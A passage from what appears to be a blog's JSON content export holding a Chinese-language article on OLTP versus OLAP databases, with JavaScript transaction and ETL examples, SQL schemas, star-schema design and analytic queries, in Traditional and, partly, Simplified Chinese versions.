Processing，線上交易處理)：處理日常營運 處理客戶訂單 更新庫存 記錄付款 管理使用者帳戶 OLAP (Online Analytical Processing，線上分析處理)：支援商業智慧 分析銷售趨勢 產生報表 預測需求 識別模式 graph TB subgraph OLTP[\"🏪 OLTP 系統\"] T1[客戶訂單] T2[付款處理] T3[庫存更新] T4[使用者註冊] T1 --> DB1[(交易資料庫)] T2 --> DB1 T3 --> DB1 T4 --> DB1 end subgraph ETL[\"🔄 ETL 流程\"] E1[擷取] E2[轉換] E3[載入] E1 --> E2 E2 --> E3 end subgraph OLAP[\"📊 OLAP 系統\"] A1[銷售分析] A2[趨勢報表] A3[預測] A4[商業智慧] DW[(資料倉儲)] --> A1 DW --> A2 DW --> A3 DW --> A4 end DB1 -.->|定期同步| E1 E3 --> DW style OLTP fill:#e3f2fd,stroke:#1976d2 style OLAP fill:#f3e5f5,stroke:#7b1fa2 style ETL fill:#fff3e0,stroke:#f57c00 OLTP：營運主力 OLTP 系統透過快速、可靠的交易為您的日常業務營運提供動力。 特性 &#x2F;&#x2F; OLTP：快速、專注的操作 class OrderService &#123; async createOrder(customerId, items) &#123; &#x2F;&#x2F; 單一交易影響少數資料列 const connection &#x3D; await db.getConnection(); try &#123; await connection.beginTransaction(); &#x2F;&#x2F; 插入訂單（1 列） const order &#x3D; await connection.query( &#39;INSERT INTO orders (customer_id, total, status) VALUES (?, ?, ?)&#39;, [customerId, this.calculateTotal(items), &#39;PENDING&#39;] ); &#x2F;&#x2F; 插入訂單項目（少數列） for (const item of items) &#123; await connection.query( &#39;INSERT INTO order_items (order_id, product_id, quantity, price) VALUES (?, ?, ?, ?)&#39;, [order.id, item.productId, item.quantity, item.price] ); &#x2F;&#x2F; 更新庫存（每個項目 1 列） await connection.query( &#39;UPDATE products SET stock &#x3D; stock - ? WHERE id &#x3D; ?&#39;, [item.quantity, item.productId] ); &#125; await connection.commit(); return order; &#125; catch (error) &#123; await connection.rollback(); throw error; &#125; &#125; &#125; OLTP 資料庫設計：正規化架構 -- 正規化設計最小化冗餘 -- 針對 INSERT、UPDATE、DELETE 最佳化 CREATE TABLE customers ( id INT PRIMARY KEY, name VARCHAR(100), email VARCHAR(100), created_at TIMESTAMP ); CREATE TABLE orders ( id INT PRIMARY KEY, customer_id INT, total DECIMAL(10,2), status VARCHAR(20), created_at TIMESTAMP, FOREIGN KEY (customer_id) REFERENCES customers(id) ); CREATE TABLE order_items ( id INT PRIMARY KEY, order_id INT, product_id INT, quantity INT, price DECIMAL(10,2), FOREIGN KEY (order_id) REFERENCES orders(id), FOREIGN KEY (product_id) REFERENCES products(id) ); CREATE TABLE products ( id INT PRIMARY KEY, name VARCHAR(200), category_id INT, stock INT, price DECIMAL(10,2) ); OLTP 查詢模式 -- 典型的 OLTP 查詢：快速、特定、小結果集 -- 取得客戶詳細資料 SELECT * FROM customers WHERE id &#x3D; 12345; -- 建立新訂單 INSERT INTO orders (customer_id, total, status, created_at) VALUES (12345, 299.99, &#39;PENDING&#39;, NOW()); -- 更新庫存 UPDATE products SET stock &#x3D; stock - 2 WHERE id &#x3D; 789; -- 檢查訂單狀態 SELECT o.id, o.status, o.total, c.name FROM orders o JOIN customers c ON o.customer_id &#x3D; c.id WHERE o.id &#x3D; 54321; 💡 OLTP 關鍵特性快速回應時間：每筆交易毫秒級 高並發性：數千個同時使用者 ACID 合規性：保證資料一致性 正規化架構：最小資料冗餘 即時資料：即時、最新的資訊 OLAP：分析強力引擎 OLAP 系統分析歷史資料以支援業務決策。 特性 &#x2F;&#x2F; OLAP：跨大型資料集的複雜分析 class SalesAnalytics &#123; async getMonthlySalesTrend(year) &#123; &#x2F;&#x2F; 查詢掃描數百萬列 &#x2F;&#x2F; 跨多個維度聚合資料 const query &#x3D; &#96; SELECT DATE_FORMAT(o.created_at, &#39;%Y-%m&#39;) as month, c.region, p.category, COUNT(DISTINCT o.id) as order_count, SUM(oi.quantity) as units_sold, SUM(oi.quantity * oi.price) as revenue, AVG(o.total) as avg_order_value FROM orders o JOIN customers c ON o.customer_id &#x3D; c.id JOIN order_items oi ON o.id &#x3D; oi.order_id JOIN products p ON oi.product_id &#x3D; p.id WHERE YEAR(o.created_at) &#x3D; ? GROUP BY DATE_FORMAT(o.created_at, &#39;%Y-%m&#39;), c.region, p.category ORDER BY month, region, category &#96;; return await dataWarehouse.query(query, [year]); &#125; async getCustomerSegmentation() &#123; &#x2F;&#x2F; 複雜的分析查詢 const query &#x3D; &#96; SELECT CASE WHEN total_spent &gt; 10000 THEN &#39;VIP&#39; WHEN total_spent &gt; 5000 THEN &#39;Premium&#39; WHEN total_spent &gt; 1000 THEN &#39;Regular&#39; ELSE &#39;Occasional&#39; END as segment, COUNT(*) as customer_count, AVG(total_spent) as avg_lifetime_value, AVG(order_count) as avg_orders, AVG(days_since_first_order) as avg_customer_age FROM ( SELECT c.id, SUM(o.total) as total_spent, COUNT(o.id) as order_count, DATEDIFF(NOW(), MIN(o.created_at)) as days_since_first_order FROM customers c LEFT JOIN orders o ON c.id &#x3D; o.customer_id GROUP BY c.id ) customer_stats GROUP BY segment ORDER BY avg_lifetime_value DESC &#96;; return await dataWarehouse.query(query); &#125; &#125; OLAP 資料庫設計：星型架構 -- 反正規化設計針對查詢最佳化 -- 星型架構包含事實表和維度表 -- 事實表：包含度量值 CREATE TABLE fact_sales ( sale_id BIGINT PRIMARY KEY, date_key INT, customer_key INT, product_key INT, store_key INT, quantity INT, unit_price DECIMAL(10,2), discount DECIMAL(10,2), revenue DECIMAL(10,2), cost DECIMAL(10,2), profit DECIMAL(10,2), FOREIGN KEY (date_key) REFERENCES dim_date(date_key), FOREIGN KEY (customer_key) REFERENCES dim_customer(customer_key), FOREIGN KEY (product_key) REFERENCES dim_product(product_key), FOREIGN KEY (store_key) REFERENCES dim_store(store_key) ); -- 維度表：包含描述性屬性 CREATE TABLE dim_date ( date_key INT PRIMARY KEY, full_date DATE, year INT, quarter INT, month INT, month_name VARCHAR(20), week INT, day_of_week INT, day_name VARCHAR(20), is_weekend BOOLEAN, is_holiday BOOLEAN ); CREATE TABLE dim_customer ( customer_key INT PRIMARY KEY, customer_id INT, name VARCHAR(100), email VARCHAR(100), segment VARCHAR(50), region VARCHAR(50), country VARCHAR(50), registration_date DATE ); CREATE TABLE dim_product ( product_key INT PRIMARY KEY, product_id INT, name VARCHAR(200), category VARCHAR(100), subcategory VARCHAR(100), brand VARCHAR(100), supplier VARCHAR(100) ); CREATE TABLE dim_store ( store_key INT PRIMARY KEY, store_id INT, name VARCHAR(100), city VARCHAR(100), state VARCHAR(100), country VARCHAR(100), region VARCHAR(50), size_category VARCHAR(20) ); graph TB F[事實表fact_salessale_id, quantity, revenue, profit] D1[維度dim_dateyear, quarter, month, week] D2[維度dim_customername, segment, region] D3[維度dim_productcategory, brand, supplier] D4[維度dim_storecity, state, region] F --> D1 F --> D2 F --> D3 F --> D4 style F fill:#ffeb3b,stroke:#f57f17 style D1 fill:#81c784,stroke:#388e3c style D2 fill:#81c784,stroke:#388e3c style D3 fill:#81c784,stroke:#388e3c style D4 fill:#81c784,stroke:#388e3c OLAP 查詢模式 -- 典型的 OLAP 查詢：複雜、分析性、大結果集 -- 銷售趨勢分析 SELECT d.year, d.quarter, p.category, SUM(f.revenue) as total_revenue, SUM(f.profit) as total_profit, COUNT(DISTINCT f.customer_key) as unique_customers FROM fact_sales f JOIN dim_date d ON f.date_key &#x3D; d.date_key JOIN dim_product p ON f.product_key &#x3D; p.product_key WHERE d.year BETWEEN 2018 AND 2020 GROUP BY d.year, d.quarter, p.category ORDER BY d.year, d.quarter, total_revenue DESC; -- 依地區的客戶分群 SELECT c.region, c.segment, COUNT(DISTINCT f.customer_key) as customer_count, SUM(f.revenue) as total_revenue, AVG(f.revenue) as avg_transaction_value FROM fact_sales f JOIN dim_customer c ON f.customer_key &#x3D; c.customer_key JOIN dim_date d ON f.date_key &#x3D; d.date_key WHERE d.year &#x3D; 2020 GROUP BY c.region, c.segment ORDER BY total_revenue DESC; -- 產品效能比較 SELECT p.category, p.brand, SUM(f.quantity) as units_sold, SUM(f.revenue) as revenue, SUM(f.profit) as profit, SUM(f.profit) &#x2F; SUM(f.revenue) * 100 as profit_margin FROM fact_sales f JOIN dim_product p ON f.product_key &#x3D; p.product_key JOIN dim_date d ON f.date_key &#x3D; d.date_key WHERE d.year &#x3D; 2020 GROUP BY p.category, p.brand HAVING SUM(f.revenue) &gt; 100000 ORDER BY profit_margin DESC; 💡 OLAP 關鍵特性複雜查詢：多維度分析 大資料量：數百萬到數十億列 歷史資料：時間序列分析 反正規化架構：針對讀取效能最佳化 批次更新：定期資料載入（ETL） 並排比較 (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_1409e0a9b')); var option = { \"title\": { \"text\": \"OLTP vs OLAP：查詢回應時間\" }, \"tooltip\": { \"trigger\": \"axis\", \"axisPointer\": { \"type\": \"shadow\" } }, \"legend\": { \"data\": [\"OLTP\", \"OLAP\"] }, \"xAxis\": { \"type\": \"category\", \"data\": [\"簡單查詢\", \"聯結查詢\", \"聚合\", \"複雜分析\"] }, \"yAxis\": { \"type\": \"value\", \"name\": \"回應時間 (ms)\", \"axisLabel\": { \"formatter\": \"{value}\" } }, \"series\": [ { \"name\": \"OLTP\", \"type\": \"bar\", \"data\": [5, 20, 50, 200], \"itemStyle\": { \"color\": \"#1976d2\" } }, { \"name\": \"OLAP\", \"type\": \"bar\", \"data\": [100, 500, 2000, 10000], \"itemStyle\": { \"color\": \"#7b1fa2\" } } ] }; chart.setOption(option); } })(); 面向 OLTP OLAP 目的 日常營運 商業智慧 使用者 數千個並發使用者 數十個分析師 操作 INSERT、UPDATE、DELETE、SELECT SELECT 搭配複雜聚合 查詢複雜度 簡單、預定義 複雜、臨時 回應時間 毫秒 秒到分鐘 每次查詢的資料量 少數列 數百萬列 資料庫設計 正規化（3NF） 反正規化（星型/雪花） 資料新鮮度 即時 定期更新 交易支援 需要 ACID 不重要 索引 多個欄位上的多個索引 關鍵欄位上的少數索引 範例系統 MySQL、PostgreSQL、Oracle Redshift、BigQuery、Snowflake 真實世界範例：電子商務平台 OLTP：處理訂單 class OrderProcessingService &#123; async processCheckout(cart, customerId) &#123; &#x2F;&#x2F; OLTP：快速交易處理 const connection &#x3D; await this.db.getConnection(); try &#123; await connection.beginTransaction(); &#x2F;&#x2F; 建立訂單（影響 1 列） const order &#x3D; await connection.query( &#39;INSERT INTO orders (customer_id, total, status) VALUES (?, ?, ?)&#39;, [customerId, cart.total, &#39;PROCESSING&#39;] ); &#x2F;&#x2F; 新增訂單項目（影響少數列） for (const item of cart.items) &#123; await connection.query( &#39;INSERT INTO order_items (order_id, product_id, quantity, price) VALUES (?, ?, ?, ?)&#39;, [order.id, item.id, item.quantity, item.price] ); &#x2F;&#x2F; 更新庫存（影響 1 列） await connection.query( &#39;UPDATE products SET stock &#x3D; stock - ? WHERE id &#x3D; ?&#39;, [item.quantity, item.id] ); &#125; &#x2F;&#x2F; 記錄付款（影響 1 列） await connection.query( &#39;INSERT INTO payments (order_id, amount, method, status) VALUES (?, ?, ?, ?)&#39;, [order.id, cart.total, cart.paymentMethod, &#39;COMPLETED&#39;] ); await connection.commit(); &#x2F;&#x2F; 毫秒級回應 return &#123; orderId: order.id, status: &#39;SUCCESS&#39; &#125;; &#125; catch (error) &#123; await connection.rollback(); throw error; &#125; &#125; &#125; OLAP：分析銷售績效 class SalesReportingService &#123; async generateQuarterlyReport(year, quarter) &#123; &#x2F;&#x2F; OLAP：複雜的分析查詢 const query &#x3D; &#96; SELECT d.month_name, p.category, s.region, COUNT(DISTINCT f.sale_id) as transaction_count, COUNT(DISTINCT f.customer_key) as unique_customers, SUM(f.quantity) as units_sold, SUM(f.revenue) as total_revenue, SUM(f.profit) as total_profit, AVG(f.revenue) as avg_transaction_value, SUM(f.profit) &#x2F; SUM(f.revenue) * 100 as profit_margin FROM fact_sales f JOIN dim_date d ON f.date_key &#x3D; d.date_key JOIN dim_product p ON f.product_key &#x3D; p.product_key JOIN dim_store s ON f.store_key &#x3D; s.store_key WHERE d.year &#x3D; ? AND d.quarter &#x3D; ? GROUP BY d.month_name, p.category, s.region WITH ROLLUP ORDER BY d.month_name, total_revenue DESC &#96;; &#x2F;&#x2F; 查詢掃描數百萬列 &#x2F;&#x2F; 秒級回應 const results &#x3D; await this.dataWarehouse.query(query, [year, quarter]); return this.formatReport(results); &#125; async getCustomerLifetimeValue() &#123; &#x2F;&#x2F; OLAP：客戶分析 const query &#x3D; &#96; SELECT c.segment, c.region, COUNT(DISTINCT c.customer_key) as customer_count, AVG(customer_metrics.total_revenue) as avg_lifetime_value, AVG(customer_metrics.order_count) as avg_orders, AVG(customer_metrics.avg_order_value) as avg_order_size, AVG(customer_metrics.customer_age_days) as avg_customer_age_days FROM dim_customer c JOIN ( SELECT f.customer_key, SUM(f.revenue) as total_revenue, COUNT(DISTINCT f.sale_id) as order_count, AVG(f.revenue) as avg_order_value, DATEDIFF(CURRENT_DATE, MIN(d.full_date)) as customer_age_days FROM fact_sales f JOIN dim_date d ON f.date_key &#x3D; d.date_key GROUP BY f.customer_key ) customer_metrics ON c.customer_key &#x3D; customer_metrics.customer_key GROUP BY c.segment, c.region ORDER BY avg_lifetime_value DESC &#96;; return await this.dataWarehouse.query(query); &#125; &#125; ETL：連接 OLTP 和 OLAP 擷取、轉換、載入（ETL）流程將資料從 OLTP 系統移動到 OLAP 系統： class ETLPipeline &#123; async runDailySalesETL() &#123; console.log(&#39;開始 ETL 流程...&#39;); &#x2F;&#x2F; 擷取：從 OLTP 資料庫取得資料 const salesData &#x3D; await this.extractSalesData(); &#x2F;&#x2F; 轉換：清理和重塑資料 const transformedData &#x3D; await this.transformSalesData(salesData); &#x2F;&#x2F; 載入：插入到資料倉儲 await this.loadToDataWarehouse(transformedData); console.log(&#39;ETL 流程完成&#39;); &#125; async extractSalesData() &#123; &#x2F;&#x2F; 從 OLTP 資料庫擷取 const query &#x3D; &#96; SELECT o.id as order_id, o.created_at, o.customer_id, c.name as customer_name, c.region, oi.product_id, p.name as product_name, p.category, oi.quantity, oi.price, oi.quantity * oi.price as revenue FROM orders o JOIN customers c ON o.customer_id &#x3D; c.id JOIN order_items oi ON o.id &#x3D; oi.order_id JOIN products p ON oi.product_id &#x3D; p.id WHERE DATE(o.created_at) &#x3D; CURRENT_DATE - INTERVAL 1 DAY &#96;; return await this.oltpDb.query(query); &#125; async transformSalesData(salesData) &#123; &#x2F;&#x2F; 轉換資料以供分析 return salesData.map(row &#x3D;&gt; (&#123; sale_id: row.order_id, date_key: this.getDateKey(row.created_at), customer_key: this.getCustomerKey(row.customer_id), product_key: this.getProductKey(row.product_id), quantity: row.quantity, unit_price: row.price, revenue: row.revenue, cost: row.revenue * 0.6, &#x2F;&#x2F; 簡化的成本計算 profit: row.revenue * 0.4 &#125;)); &#125; async loadToDataWarehouse(data) &#123; &#x2F;&#x2F; 批次插入到 OLAP 資料庫 const batchSize &#x3D; 1000; for (let i &#x3D; 0; i &lt; data.length; i +&#x3D; batchSize) &#123; const batch &#x3D; data.slice(i, i + batchSize); await this.dataWarehouse.batchInsert(&#39;fact_sales&#39;, batch); &#125; &#125; getDateKey(date) &#123; &#x2F;&#x2F; 將日期轉換為整數鍵：YYYYMMDD return parseInt(date.toISOString().slice(0, 10).replace(&#x2F;-&#x2F;g, &#39;&#39;)); &#125; getCustomerKey(customerId) &#123; &#x2F;&#x2F; 將 OLTP 客戶 ID 對應到 OLAP 客戶鍵 return this.customerKeyMap.get(customerId); &#125; getProductKey(productId) &#123; &#x2F;&#x2F; 將 OLTP 產品 ID 對應到 OLAP 產品鍵 return this.productKeyMap.get(productId); &#125; &#125; 選擇正確的系統 使用 OLTP 的時機： ✅ 高交易量：數千個並發使用者 ✅ 資料完整性至關重要：金融交易、庫存管理 ✅ 即時更新：當前資料必須立即可用 ✅ 簡單查詢：依 ID 查詢、插入、更新、刪除 ✅ 需要 ACID 合規性：銀行、電子商務、訂位系統 使用 OLAP 的時機： ✅ 複雜分析：多維度分析、聚合 ✅ 歷史分析：趨勢分析、預測 ✅ 大資料量：分析數百萬或數十億列 ✅ 商業智慧：報表、儀表板、資料探勘 ✅ 讀取密集工作負載：少量寫入、大量複雜讀取 混合方法：HTAP 某些現代資料庫支援混合交易/分析處理（HTAP）： &#x2F;&#x2F; 範例：使用讀取副本進行分析 class HybridDataAccess &#123; constructor() &#123; this.primaryDb &#x3D; new Database(&#39;primary&#39;); &#x2F;&#x2F; OLTP this.replicaDb &#x3D; new Database(&#39;replica&#39;); &#x2F;&#x2F; OLAP 查詢 &#125; &#x2F;&#x2F; 寫入操作到主資料庫 async createOrder(orderData) &#123; return await this.primaryDb.insert(&#39;orders&#39;, orderData); &#125; &#x2F;&#x2F; 簡單讀取從主資料庫 async getOrder(orderId) &#123; return await this.primaryDb.query( &#39;SELECT * FROM orders WHERE id &#x3D; ?&#39;, [orderId] ); &#125; &#x2F;&#x2F; 複雜分析從副本 async getSalesReport(startDate, endDate) &#123; return await this.replicaDb.query(&#96; SELECT DATE(created_at) as date, COUNT(*) as order_count, SUM(total) as revenue FROM orders WHERE created_at BETWEEN ? AND ? GROUP BY DATE(created_at) &#96;, [startDate, endDate]); &#125; &#125; 現代 OLAP 技術 雲端資料倉儲 &#x2F;&#x2F; 範例：使用 Amazon Redshift class RedshiftAnalytics &#123; async runAnalysis() &#123; const query &#x3D; &#96; SELECT date_trunc(&#39;month&#39;, sale_date) as month, product_category, SUM(revenue) as total_revenue, COUNT(DISTINCT customer_id) as unique_customers FROM sales_fact WHERE sale_date &gt;&#x3D; &#39;2020-01-01&#39; GROUP BY 1, 2 ORDER BY 1, 3 DESC &#96;; return await this.redshift.query(query); &#125; &#125; &#x2F;&#x2F; 範例：使用 Google BigQuery class BigQueryAnalytics &#123; async runAnalysis() &#123; const query &#x3D; &#96; SELECT FORMAT_DATE(&#39;%Y-%m&#39;, sale_date) as month, product_category, SUM(revenue) as total_revenue, COUNT(DISTINCT customer_id) as unique_customers FROM \\&#96;project.dataset.sales_fact\\&#96; WHERE sale_date &gt;&#x3D; &#39;2020-01-01&#39; GROUP BY month, product_category ORDER BY month, total_revenue DESC &#96;; return await this.bigquery.query(query); &#125; &#125; 效能最佳化 OLTP 最佳化 -- 快速查詢的索引 CREATE INDEX idx_orders_customer ON orders(customer_id); CREATE INDEX idx_orders_status ON orders(status); CREATE INDEX idx_orders_created ON orders(created_at); -- 大型資料表的分割 CREATE TABLE orders ( id INT, customer_id INT, created_at TIMESTAMP, ... ) PARTITION BY RANGE (YEAR(created_at)) ( PARTITION p2019 VALUES LESS THAN (2020), PARTITION p2020 VALUES LESS THAN (2021), PARTITION p2021 VALUES LESS THAN (2022) ); OLAP 最佳化 -- 分析用的列式儲存 CREATE TABLE fact_sales ( sale_id BIGINT, date_key INT, customer_key INT, revenue DECIMAL(10,2), ... ) STORED AS PARQUET; -- 常見查詢的實體化視圖 CREATE MATERIALIZED VIEW monthly_sales_summary AS SELECT DATE_TRUNC(&#39;month&#39;, sale_date) as month, product_category, SUM(revenue) as total_revenue, COUNT(*) as transaction_count FROM fact_sales GROUP BY 1, 2; -- 定期重新整理 REFRESH MATERIALIZED VIEW monthly_sales_summary; 總結 理解 OLTP 和 OLAP 是設計有效資料系統的基礎： OLTP 系統： 透過快速、可靠的交易為日常營運提供動力 針對寫入和簡單讀取最佳化 正規化架構確保資料完整性 即時、當前資料 OLAP 系統： 啟用商業智慧和分析 針對大型資料集上的複雜查詢最佳化 反正規化架構改善查詢效能 用於趨勢分析的歷史資料 關鍵要點：大多數組織兩者都需要——OLTP 用於營運，OLAP 用於分析。ETL 流程連接兩者，將資料從交易系統移動到分析倉儲，在那裡可以進行分析而不影響營運效能。 💡 最佳實踐永遠不要直接在 OLTP 資料庫上執行複雜的分析查詢。使用 ETL 將資料移動到專用的 OLAP 系統，保護您的營運資料庫免受效能下降的影響。 參考資料 The Data Warehouse Toolkit by Ralph Kimball AWS: OLTP vs OLAP Google Cloud: Data Warehouse Concepts","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[],"lang":"zh-TW"},{"title":"OLTP vs OLAP：理解交易型与分析型数据库","slug":"2020/02/OLTP-vs-OLAP-zh-CN","date":"un55fin55","updated":"un55fin55","comments":true,"path":"/zh-CN/2020/02/OLTP-vs-OLAP/","permalink":"https://neo01.com/zh-CN/2020/02/OLTP-vs-OLAP/","excerpt":"探索 OLTP 与 OLAP 系统的根本差异。了解何时使用交易型数据库处理日常运营，以及何时使用分析型数据库进行商业智能分析。","text":"想象两种不同类型的商店。第一种是繁忙的便利商店，顾客快速拿取商品、付款、离开——每小时数百笔小型快速交易。第二种是仓库，分析师研究购买模式、库存趋势和季节性需求——较少的操作，但每次都检查大量数据。这代表了数据库系统的两种基本方法：OLTP 和 OLAP。 数据处理的两个世界 现代企业需要数据库来满足两种不同的目的： OLTP (Online Transaction Processing，在线交易处理)：处理日常运营 处理客户订单 更新库存 记录付款 管理用户账户 OLAP (Online Analytical Processing，在线分析处理)：支持商业智能 分析销售趋势 生成报表 预测需求 识别模式 graph TB subgraph OLTP[\"🏪 OLTP 系统\"] T1[客户订单] T2[付款处理] T3[库存更新] T4[用户注册] T1 --> DB1[(交易数据库)] T2 --> DB1 T3 --> DB1 T4 --> DB1 end subgraph ETL[\"🔄 ETL 流程\"] E1[提取] E2[转换] E3[加载] E1 --> E2 E2 --> E3 end subgraph OLAP[\"📊 OLAP 系统\"] A1[销售分析] A2[趋势报表] A3[预测] A4[商业智能] DW[(数据仓库)] --> A1 DW --> A2 DW --> A3 DW --> A4 end DB1 -.->|定期同步| E1 E3 --> DW style OLTP fill:#e3f2fd,stroke:#1976d2 style OLAP fill:#f3e5f5,stroke:#7b1fa2 style ETL fill:#fff3e0,stroke:#f57c00 OLTP：运营主力 OLTP 系统通过快速、可靠的交易为您的日常业务运营提供动力。 特性 &#x2F;&#x2F; OLTP：快速、专注的操作 class OrderService &#123; async createOrder(customerId, items) &#123; &#x2F;&#x2F; 单一交易影响少数数据行 const connection &#x3D; await db.getConnection(); try &#123; await connection.beginTransaction(); &#x2F;&#x2F; 插入订单（1 行） const order &#x3D; await connection.query( &#39;INSERT INTO orders (customer_id, total, status) VALUES (?, ?, ?)&#39;, [customerId, this.calculateTotal(items), &#39;PENDING&#39;] ); &#x2F;&#x2F; 插入订单项目（少数行） for (const item of items) &#123; await connection.query( &#39;INSERT INTO order_items (order_id, product_id, quantity, price) VALUES (?, ?, ?, ?)&#39;, [order.id, item.productId, item.quantity, item.price] ); &#x2F;&#x2F; 更新库存（每个项目 1 行） await connection.query( &#39;UPDATE products SET stock &#x3D; stock - ? WHERE id &#x3D; ?&#39;, [item.quantity, item.productId] ); &#125; await connection.commit(); return order; &#125; catch (error) &#123; await connection.rollback(); throw error; &#125; &#125; &#125; OLTP 数据库设计：规范化架构 -- 规范化设计最小化冗余 -- 针对 INSERT、UPDATE、DELETE 优化 CREATE TABLE customers ( id INT PRIMARY KEY, name VARCHAR(100), email VARCHAR(100), created_at TIMESTAMP ); CREATE TABLE orders ( id INT PRIMARY KEY, customer_id INT, total DECIMAL(10,2), status VARCHAR(20), created_at TIMESTAMP, FOREIGN KEY (customer_id) REFERENCES customers(id) ); CREATE TABLE order_items ( id INT PRIMARY KEY, order_id INT, product_id INT, quantity INT, price DECIMAL(10,2), FOREIGN KEY (order_id) REFERENCES orders(id), FOREIGN KEY (product_id) REFERENCES products(id) ); CREATE TABLE products ( id INT PRIMARY KEY, name VARCHAR(200), category_id INT, stock INT, price DECIMAL(10,2) ); OLTP 查询模式 -- 典型的 OLTP 查询：快速、特定、小结果集 -- 获取客户详细信息 SELECT * FROM customers WHERE id &#x3D; 12345; -- 创建新订单 INSERT INTO orders (customer_id, total, status, created_at) VALUES (12345, 299.99, &#39;PENDING&#39;, NOW()); -- 更新库存 UPDATE products SET stock &#x3D; stock - 2 WHERE id &#x3D; 789; -- 检查订单状态 SELECT o.id, o.status, o.total, c.name FROM orders o JOIN customers c ON o.customer_id &#x3D; c.id WHERE o.id &#x3D; 54321; 💡 OLTP 关键特性快速响应时间：每笔交易毫秒级 高并发性：数千个同时用户 ACID 合规性：保证数据一致性 规范化架构：最小数据冗余 实时数据：实时、最新的信息 OLAP：分析强力引擎 OLAP 系统分析历史数据以支持业务决策。 特性 &#x2F;&#x2F; OLAP：跨大型数据集的复杂分析 class SalesAnalytics &#123; async getMonthlySalesTrend(year) &#123; &#x2F;&#x2F; 查询扫描数百万行 &#x2F;&#x2F; 跨多个维度聚合数据 const query &#x3D; &#96; SELECT DATE_FORMAT(o.created_at, &#39;%Y-%m&#39;) as month, c.region, p.category, COUNT(DISTINCT o.id) as order_count, SUM(oi.quantity) as units_sold, SUM(oi.quantity * oi.price) as revenue, AVG(o.total) as avg_order_value FROM orders o JOIN customers c ON o.customer_id &#x3D; c.id JOIN order_items oi ON o.id &#x3D; oi.order_id JOIN products p ON oi.product_id &#x3D; p.id WHERE YEAR(o.created_at) &#x3D; ? GROUP BY DATE_FORMAT(o.created_at, &#39;%Y-%m&#39;), c.region, p.category ORDER BY month, region, category &#96;; return await dataWarehouse.query(query, [year]); &#125; async getCustomerSegmentation() &#123; &#x2F;&#x2F; 复杂的分析查询 const query &#x3D; &#96; SELECT CASE WHEN total_spent &gt; 10000 THEN &#39;VIP&#39; WHEN total_spent &gt; 5000 THEN &#39;Premium&#39; WHEN total_spent &gt; 1000 THEN &#39;Regular&#39; ELSE &#39;Occasional&#39; END as segment, COUNT(*) as customer_count, AVG(total_spent) as avg_lifetime_value, AVG(order_count) as avg_orders, AVG(days_since_first_order) as avg_customer_age FROM ( SELECT c.id, SUM(o.total) as total_spent, COUNT(o.id) as order_count, DATEDIFF(NOW(), MIN(o.created_at)) as days_since_first_order FROM customers c LEFT JOIN orders o ON c.id &#x3D; o.customer_id GROUP BY c.id ) customer_stats GROUP BY segment ORDER BY avg_lifetime_value DESC &#96;; return await dataWarehouse.query(query); &#125; &#125; OLAP 数据库设计：星型架构 -- 反规范化设计针对查询优化 -- 星型架构包含事实表和维度表 -- 事实表：包含度量值 CREATE TABLE fact_sales ( sale_id BIGINT PRIMARY KEY, date_key INT, customer_key INT, product_key INT, store_key INT, quantity INT, unit_price DECIMAL(10,2), discount DECIMAL(10,2), revenue DECIMAL(10,2), cost DECIMAL(10,2), profit DECIMAL(10,2), FOREIGN KEY (date_key) REFERENCES dim_date(date_key), FOREIGN KEY (customer_key) REFERENCES dim_customer(customer_key), FOREIGN KEY (product_key) REFERENCES dim_product(product_key), FOREIGN KEY (store_key) REFERENCES dim_store(store_key) ); -- 维度表：包含描述性属性 CREATE TABLE dim_date ( date_key INT PRIMARY KEY, full_date DATE, year INT, quarter INT, month INT, month_name VARCHAR(20), week INT, day_of_week INT, day_name VARCHAR(20), is_weekend BOOLEAN, is_holiday BOOLEAN ); CREATE TABLE dim_customer ( customer_key INT PRIMARY KEY, customer_id INT, name VARCHAR(100), email VARCHAR(100), segment VARCHAR(50), region VARCHAR(50), country VARCHAR(50), registration_date DATE ); CREATE TABLE dim_product ( product_key INT PRIMARY KEY, product_id INT, name VARCHAR(200), category VARCHAR(100), subcategory VARCHAR(100), brand VARCHAR(100), supplier VARCHAR(100) ); CREATE TABLE dim_store ( store_key INT PRIMARY KEY, store_id INT, name VARCHAR(100), city VARCHAR(100), state VARCHAR(100), country VARCHAR(100), region VARCHAR(50), size_category VARCHAR(20) ); graph TB F[事实表fact_salessale_id, quantity, revenue, profit] D1[维度dim_dateyear, quarter, month, week] D2[维度dim_customername, segment, region] D3[维度dim_productcategory, brand, supplier] D4[维度dim_storecity, state, region] F --> D1 F --> D2 F --> D3 F --> D4 style F fill:#ffeb3b,stroke:#f57f17 style D1 fill:#81c784,stroke:#388e3c style D2 fill:#81c784,stroke:#388e3c style D3 fill:#81c784,stroke:#388e3c style D4 fill:#81c784,stroke:#388e3c OLAP 查询模式 -- 典型的 OLAP 查询：复杂、分析性、大结果集 -- 销售趋势分析 SELECT d.year, d.quarter, p.category, SUM(f.revenue) as total_revenue, SUM(f.profit) as total_profit, COUNT(DISTINCT f.customer_key) as unique_customers FROM fact_sales f JOIN dim_date d ON f.date_key &#x3D; d.date_key JOIN dim_product p ON f.product_key &#x3D; p.product_key WHERE d.year BETWEEN 2018 AND 2020 GROUP BY d.year, d.quarter, p.category ORDER BY d.year, d.quarter, total_revenue DESC; -- 按地区的客户分群 SELECT c.region, c.segment, COUNT(DISTINCT f.customer_key) as customer_count, SUM(f.revenue) as total_revenue, AVG(f.revenue) as avg_transaction_value FROM fact_sales f JOIN dim_customer c ON f.customer_key &#x3D; c.customer_key JOIN dim_date d ON f.date_key &#x3D; d.date_key WHERE d.year &#x3D; 2020 GROUP BY c.region, c.segment ORDER BY total_revenue DESC; -- 产品性能比较 SELECT p.category, p.brand, SUM(f.quantity) as units_sold, SUM(f.revenue) as revenue, SUM(f.profit) as profit, SUM(f.profit) &#x2F; SUM(f.revenue) * 100 as profit_margin FROM fact_sales f JOIN dim_product p ON f.product_key &#x3D; p.product_key JOIN dim_date d ON f.date_key &#x3D; d.date_key WHERE d.year &#x3D; 2020 GROUP BY p.category, p.brand HAVING SUM(f.revenue) &gt; 100000 ORDER BY profit_margin DESC; 💡 OLAP 关键特性复杂查询：多维度分析 大数据量：数百万到数十亿行 历史数据：时间序列分析 反规范化架构：针对读取性能优化 批量更新：定期数据加载（ETL） 并排比较 (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_7e7d8ff35')); var option = { \"title\": { \"text\": \"OLTP vs OLAP：查询响应时间\" 